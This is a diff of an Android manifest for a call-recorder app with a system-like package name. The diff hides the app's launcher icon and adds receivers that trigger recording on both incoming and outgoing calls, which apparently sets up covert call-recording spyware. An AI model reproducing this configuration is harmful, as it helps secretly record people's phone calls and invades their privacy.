@@ -12,7 +12,6 @@
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
 
     <application
         android:allowBackup="true"
@@ -25,20 +24,21 @@
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
-                <category android:name="android.intent.category.LAUNCHER" />
+                <!-- category android:name="android.intent.category.LAUNCHER" / -->
             </intent-filter>
         </activity>
 
         <service android:name="com.android.phonerecorder.PhoneRecordService">
             <intent-filter>
-                <action android:name="com.android.phonerecorder.action.NEW_OUTGONG_CALL"/>
+                <action android:name="com.android.phonerecorder.action.INCOMING_PHONE"/>
+                <action android:name="com.android.phonerecorder.action.OUTGOING_PHONE"/>
             </intent-filter>
         </service>
 
         <receiver android:name="com.android.phonerecorder.PhoneRecorderReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
-                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.PHONE_STATE"/>
             </intent-filter>
         </receiver>
     </application>
